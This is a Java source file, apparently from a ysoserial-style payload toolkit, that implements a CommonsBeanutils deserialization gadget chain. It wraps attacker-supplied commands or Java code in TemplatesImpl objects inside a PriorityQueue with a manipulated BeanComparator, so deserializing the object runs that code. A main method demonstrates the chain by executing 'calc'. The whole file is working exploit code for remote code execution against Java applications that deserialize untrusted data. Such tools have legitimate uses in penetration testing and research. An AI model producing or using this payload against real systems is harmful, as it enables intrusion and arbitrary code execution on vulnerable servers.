package mysocall.payloads;

import mysocall.payloads.annotation.Authors;
import mysocall.payloads.annotation.Dependencies;
import mysocall.payloads.util.Gadgets;
import mysocall.payloads.util.Reflections;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.util.Comparator;
import java.util.PriorityQueue;

@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
@Authors({Authors.THEWHO})
public class CommonsBeanutils2 implements ObjectPayload<Object> {
    public Object getObject(String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);

        Constructor constructor = Reflections.getFirstCtor("java.util.Collections$ReverseComparator");
        Reflections.setAccessible(constructor);
        Object obj = constructor.newInstance();

        final BeanComparator comparator = new BeanComparator(null, (Comparator) obj);

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        Reflections.setFieldValue(comparator, "property", "outputProperties");
        Reflections.setFieldValue(queue, "queue", new Object[]{templates, templates});

        return queue;
    }

    public Object getObjectByCode(String code) throws Exception {
        final Object templates = Gadgets.createTemplatesImplByCode(code);

        Constructor constructor = Reflections.getFirstCtor("java.util.Collections$ReverseComparator");
        Reflections.setAccessible(constructor);
        Object obj = constructor.newInstance();

        final BeanComparator comparator = new BeanComparator(null, (Comparator) obj);

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        Reflections.setFieldValue(comparator, "property", "outputProperties");
        Reflections.setFieldValue(queue, "queue", new Object[]{templates, templates});

        return queue;
    }

    public static void main(String[] args) throws Exception {
        CommonsBeanutils2 cb2 = new CommonsBeanutils2();
        // Object obj = getObject("calc");
        String code = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        Object obj = cb2.getObjectByCode(code);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(obj);
        oos.close();

        byte[] bytes = barr.toByteArray();
//        FileOutputStream os = new FileOutputStream("a.tmp");
//        os.write(bytes);
//        os.close();
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
        ois.readObject();
    }

}
